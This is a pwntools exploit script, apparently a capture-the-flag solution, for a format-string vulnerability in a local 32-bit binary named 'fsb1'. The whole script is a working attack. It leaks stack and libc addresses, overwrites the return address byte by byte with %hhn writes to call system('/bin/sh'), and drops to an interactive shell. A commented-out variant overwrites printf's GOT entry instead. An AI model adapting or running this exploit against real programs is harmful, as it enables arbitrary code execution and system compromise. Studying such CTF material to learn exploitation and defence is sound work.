#coding=utf-8
__author__="rocky"

from pwn import *
p=process('./fsb1')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
elf=ELF('./fsb1')

p.recvuntil('please input:')
p.sendline('|%18$x|%19$x|%27$x|')
data=p.recvuntil('\n').split('|')
stack_e=int(data[1],16)-0x68
ret=int(data[2],16)
ret_a=stack_e+0x4c
libc.address=int(data[3],16)-0x19a83
print 'stack_e:',hex(stack_e)
print 'ret:',hex(ret)
print 'ret_a:',hex(ret_a)
print 'libc:',hex(libc.address)

#覆盖返回地址
def wd(address, data):
    for ff in range(4):
        t = (data>>(ff*8))&0xff
        payload = r"%" + str(t) + r"d%10$hhn"
        payload = payload.ljust(20, "A")
        payload += p32(address + ff)
        print payload
        p.recvuntil('please input:')
        p.sendline(payload)
        p.recvuntil('\n')
    print 'write complete'
wd(ret_a, libc.symbols['system'])
wd(ret_a+8, next(libc.search('/bin/sh')))
p.recvuntil('please input:')
p.sendline(r"exit")

#修改got表
# printf_got=elf.got['printf']
# system_a=libc.symbols['system']
# system_l=system_a&0xffff
# system_h=(system_a>>16)&0xffff
# print hex(system_a),hex(system_h),hex(system_l)
# payload='%'+str(system_l)+'c%12$hn'+'%'+str(system_h-system_l)+'c%13$hn'
# payload=payload.ljust(28,'A')
# payload+=p32(printf_got)+p32(printf_got+0x2)
# print payload
# p.sendline(payload)

p.interactive()